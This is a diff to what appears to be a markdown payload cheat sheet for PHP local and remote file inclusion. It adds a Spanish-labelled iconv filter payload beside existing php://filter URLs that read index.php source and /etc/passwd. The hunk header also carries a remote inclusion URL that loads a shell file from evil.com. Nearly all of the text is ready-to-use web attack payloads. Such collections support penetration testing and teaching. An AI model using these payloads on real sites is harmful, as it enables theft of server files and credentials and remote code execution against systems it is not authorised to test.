@@ -139,13 +139,18 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 > LFI Wrapper rot13 and base64 - php://filter case insensitive.
 
 ```
-
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 
 Can be chained with a compression wrapper.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+```
+> LFI Conversión Codificación de caracteres
+
++ Permite visualizar contenido archivo en la misma pagina web
+```
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
 ```
 
 > LFI Wrapper ZIP :
